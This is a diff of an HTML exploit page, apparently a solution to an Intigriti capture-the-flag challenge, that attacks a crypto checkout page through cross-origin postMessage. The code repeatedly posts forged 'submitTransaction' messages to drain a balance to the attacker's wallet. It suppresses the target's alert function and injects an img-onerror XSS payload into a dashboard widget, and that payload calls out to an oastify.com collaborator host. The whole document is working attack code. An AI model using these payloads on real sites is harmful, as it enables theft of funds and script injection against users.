@@ -1,38 +1,49 @@
 <!DOCTYPE html>
 <html>
 <body style="background:#050A0E;color:#00FF88;font-family:monospace;text-align:center;padding-top:20%;">
-    <h1>REDIRECTING TO 1337COIN TERMINAL...</h1>
+    <h1>INITIATING SILENT TRANSFER...</h1>
     <script>
-        // Use YOUR wallet address from your dashboard
         const MY_WALLET = '1f3d796f822b439dc366e4de68133f13c2'; 
+        const COLLAB = 'https://bvajzm2dn1l8rtpiu46qg0kds4yvmoad.oastify.com';
         const TARGET = 'https://challenge-0126.intigriti.io/checkout.html?currency=1337COIN&price=1';
         
-        // 1. Open the checkout window
-        // This is the only way to get Chrome to send 'Lax' cookies for the session
+        // Step 1: Open the target window
         const win = window.open(TARGET);
 
-        // 2. The "Atomic" Spam
-        // We spam every 50ms to hit the listener exactly when the page loads
+        // Step 2: Kill Alerts & Spam Transaction
+        // We overwrite the alert function so the bot doesn't freeze.
         let count = 0;
         const heist = setInterval(() => {
             if (win) {
+                try {
+                    win.alert = () => {}; // Kill the blocking alert
+                } catch(e) {}
+
                 win.postMessage({
                     type: 'submitTransaction',
                     transaction: {
                         currency: '1337COIN',
-                        amount: 100000000, // Draining the full balance
+                        amount: 100000000, 
                         toAddress: MY_WALLET
                     }
                 }, '*');
             }
             count++;
-            if (count > 100) clearInterval(heist);
-        }, 50);
+            if (count > 50) clearInterval(heist);
+        }, 200);
 
-        // 3. Final Redirect to Dashboard to confirm the transfer
+        // Step 3: Trigger the XSS on the Dashboard to verify the loot
+        // We use the widgetId 'customReports' found in your source image
         setTimeout(() => {
-            window.location.href = 'https://challenge-0126.intigriti.io/dashboard.html';
-        }, 8000);
+            const dashboard = window.open('https://challenge-0126.intigriti.io/dashboard.html');
+            setTimeout(() => {
+                dashboard.postMessage({
+                    type: 'updateContent',
+                    widgetId: 'customReports',
+                    content: `<img src=x onerror="fetch('${COLLAB}/?status=Drained')">`
+                }, '*');
+            }, 2000);
+        }, 6000);
     </script>
 </body>
 </html>
